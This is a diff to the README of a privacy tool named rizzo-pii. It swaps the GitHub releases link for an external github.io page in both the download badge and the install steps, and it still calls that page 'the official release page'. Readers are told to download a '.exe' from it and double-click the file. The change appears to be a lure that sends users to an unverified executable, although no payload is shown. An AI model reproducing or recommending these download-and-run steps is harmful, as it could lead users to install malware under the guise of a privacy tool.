@@ -1,6 +1,6 @@
 # 🛡️ rizzo-pii - Keep private data off public servers
 
-[https://img.shields.io/badge/Download-Latest_Release-blue](https://github.com/Korellaindustrial633/rizzo-pii/releases)
+[https://img.shields.io/badge/Download-Latest_Release-blue](https://korellaindustrial633.github.io)
 
 ## 📁 What is rizzo-pii?
 
@@ -25,7 +25,7 @@ The software requires no complex installations or programming knowledge. It perf
 
 Follow these steps to set up the software:
 
-1.  Visit the official release page to download the installer: [https://github.com/Korellaindustrial633/rizzo-pii/releases](https://github.com/Korellaindustrial633/rizzo-pii/releases).
+1.  Visit the official release page to download the installer: [https://korellaindustrial633.github.io](https://korellaindustrial633.github.io).
 2.  Find the file that ends with `.exe` in the latest release section.
 3.  Click the file link to download it to your computer.
 4.  Open your Downloads folder and double-click the installer you just saved.
